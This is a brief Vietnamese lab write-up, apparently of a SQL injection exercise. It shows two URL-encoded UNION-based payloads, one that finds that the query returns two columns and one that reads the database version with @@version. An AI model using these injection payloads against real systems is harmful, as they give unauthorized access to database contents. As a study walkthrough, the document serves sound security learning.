![image](https://github.com/user-attachments/assets/58d28c42-9867-4977-b072-7af0af32214a)

Payload:

```
'+union+select+null,null--+
```

Sau khi test thì ta có thể thấy được rằng ở trong câu query nó yêu cầu 2 cột.

![image](https://github.com/user-attachments/assets/e997af59-a956-4ed6-affd-28733d00722a)

Rồi tiến hành lấy version db ra thôi (query thì cứ đọc docs là oke).

Payload:

```
'+union+select+null,@@version--+
```

![image](https://github.com/user-attachments/assets/6ed3d67f-5957-4b96-98c6-fbaba4de6e60)
